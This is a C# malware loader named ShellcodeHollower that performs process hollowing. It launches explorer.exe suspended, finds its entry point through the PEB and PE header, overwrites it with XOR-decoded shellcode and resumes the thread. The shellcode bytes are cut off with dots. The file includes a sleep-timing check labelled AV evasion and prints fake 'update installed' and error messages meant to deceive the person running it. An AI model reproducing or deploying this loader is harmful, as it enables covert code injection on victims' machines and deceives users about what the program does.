using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace ShellcodeHollower
{
    class Program
    {
        // Import the necessary Win32 API functions
        public const uint CREATE_SUSPENDED = 0x4;
        public const int PROCESSBASICINFORMATION = 0;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct ProcessInfo
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 ProcessId;
            public Int32 ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartupInfo
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct ProcessBasicInfo
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref StartupInfo lpStartupInfo, out ProcessInfo lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,
            ref ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer,
            int dwSize, out IntPtr lpNumberOfbytesRW);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        static void Main(string[] args)
        {
            
            Console.WriteLine("---------------------------------------------------------");
            // AV evasion: Sleep for 10s and detect if time really passed
            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;

            // The encoded shellcode
            byte[] buf = new byte[510] {
0xbe, 0x0a, 0xc1, 0xa6, 0xb2, 0xaa, 0x8e, ....

};


            //
            // ------------------ Get keys from file or create the file with keys -----------------
            //

            // The path to the directory containing the executable
            //string exeDirectory = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);
            string exeDirectory = "c:\\temp\\";
            // The path to the file containing the keys
            string keyFilePath = Path.Combine(exeDirectory, "keys.bin");

            // Check if the key file exists
            if (File.Exists(keyFilePath))
            {
                // Read the keys from the file
                byte[] keys = File.ReadAllBytes(keyFilePath);
                byte key1 = keys[0];
                byte key2 = keys[1];
                

                
                int payloadSize = buf.Length;
                
                for (int i = 0; i < buf.Length; i++)
                {
                    buf[i] = (byte)((uint)buf[i] ^ key2);
                }
    //------------- DEBUG

    //------------- END DEBUG
                Console.WriteLine("---------------------------------------------------------");
                Console.WriteLine("----------------------------------------------------100%");
                Console.WriteLine(" Update installed successfully!");
                Sleep(5);
                //
                // ------------------ NO RUN HOLLOWER!
                //
                // Start 'svchost.exe' in a suspended state
                StartupInfo sInfo = new StartupInfo();
                ProcessInfo pInfo = new ProcessInfo();
                bool cResult = CreateProcess(null, "c:\\windows\\explorer.exe", IntPtr.Zero, IntPtr.Zero,
                    false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);

                // Get Process Environment Block (PEB) memory address of suspended process (offset 0x10 from base image)
                ProcessBasicInfo pbInfo = new ProcessBasicInfo();
                uint retLen = new uint();
                long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
                IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x10);

                // Get entry point of the actual process executable
                // This one is a bit complicated, because this address differs for each process (due to Address Space Layout Randomization (ASLR))
                // From the PEB (address we got in last call), we have to do the following:
                // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
                // 2. Read the field 'e_lfanew', 4 bytes at offset 0x3C from executable address to get the offset for the PE header
                // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
                // 4. Read the value at the RVA offset address to get the offset of the executable entrypoint from the executable address
                // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!

                // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
                byte[] procAddr = new byte[0x8];
                byte[] dataBuf = new byte[0x200];
                IntPtr bytesRW = new IntPtr();
                bool result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
                IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(procAddr, 0);
                result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);
            //    Console.WriteLine($"DEBUG: Executable base address: {"0x" + executableAddress.ToString("x")}.");

                // 2. Read the field 'e_lfanew', 4 bytes (UInt32) at offset 0x3C from executable address to get the offset for the PE header
                uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3c);
          //      Console.WriteLine($"DEBUG: e_lfanew offset: {"0x" + e_lfanew.ToString("x")}.");

                // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
                uint rvaOffset = e_lfanew + 0x28;
          //      Console.WriteLine($"DEBUG: RVA offset: {"0x" + rvaOffset.ToString("x")}.");

                // 4. Read the 4 bytes (UInt32) at the RVA offset to get the offset of the executable entrypoint from the executable address
                uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);
          //      Console.WriteLine($"DEBUG: RVA value: {"0x" + rva.ToString("x")}.");

                // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!
                IntPtr entrypointAddr = (IntPtr)((Int64)executableAddress + rva);
           //     Console.WriteLine($"Got executable entrypoint address: {"0x" + entrypointAddr.ToString("x")}.");

                // Overwrite the memory at the identified address to 'hijack' the entrypoint of the executable
                result = WriteProcessMemory(pInfo.hProcess, entrypointAddr, buf, buf.Length, out bytesRW);
           //     Console.WriteLine($"Overwrote entrypoint with payload. Success: {result}.");

                // Resume the thread to trigger our payload
                uint rResult = ResumeThread(pInfo.hThread);
            }
            else
            {
                Console.WriteLine("---------------------------------------------------------");
                Console.WriteLine("----------------------------------------------76%");
                Sleep(1000);
                Console.WriteLine("Function Not Found: Error occured, please try to restart program.");
                // Write a new key file to disk
                byte[] keys = { 0x41, 0x42 };
                File.WriteAllBytes(keyFilePath, keys);
                Sleep(10000);
               // Console.WriteLine("Key file not found. A new key file has been created.");
            }
        }
    }
}
